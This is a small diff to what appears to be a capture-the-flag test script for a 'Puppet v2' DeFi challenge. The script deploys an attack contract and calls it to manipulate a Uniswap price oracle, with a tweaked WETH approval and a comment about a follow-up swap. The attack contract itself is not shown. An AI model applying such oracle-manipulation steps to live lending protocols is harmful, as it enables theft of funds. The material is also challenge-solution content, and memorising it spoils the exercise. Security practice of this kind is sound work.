@@ -90,11 +90,13 @@ describe('[Challenge] Puppet v2', function () {
 
         let AttackPuppet = await (await ethers.getContractFactory('AttackV2Puppet', player)).deploy(lendingPool.address, uniswapRouter.address, token.address, weth.address, uniswapExchange.address, uniswapFactory.address);
 
-        await weth.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_ETH_BALANCE);
+        await weth.connect(player).approve(AttackPuppet.address, 19n * 10n ** 18n);
         await token.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
         
         // Swap tokens for ETH /reduce price oracle
         await AttackPuppet.attack();
+
+        //swap our remaing WETH for tokens
     });
 
     after(async function () {
